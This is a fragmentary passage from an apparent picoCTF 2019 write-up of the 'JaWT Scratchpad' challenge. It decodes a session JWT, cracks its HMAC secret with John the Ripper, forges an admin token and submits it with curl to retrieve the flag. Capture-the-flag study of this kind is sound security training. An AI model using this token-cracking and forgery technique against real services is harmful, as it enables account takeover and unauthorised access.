...
< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._[AWS_SECRET_REMOVED]2Y; Path=/
...
undefined
> chef.JWTDecode("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._[AWS_SECRET_REMOVED]2Y");
{
    "user": "john"
}
>
...
iJ9._[AWS_SECRET_REMOVED]2Y > jwt.john
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# cat jwt.john
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9#[AWS_SECRET_REMOVED]f0a48f10dba8513c34e1df66
```
...
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[AWS_SECRET_REMOVED]NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8
```

We resend the request to the website and receive the flag:

```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl "https://2019shell1.picoctf.com/problem/37903/#"  -H "Content-Type: application/x-www-form-urlencoded"  --data "user=admin" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[AWS_SECRET_REMOVED]NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8" -s | grep pico
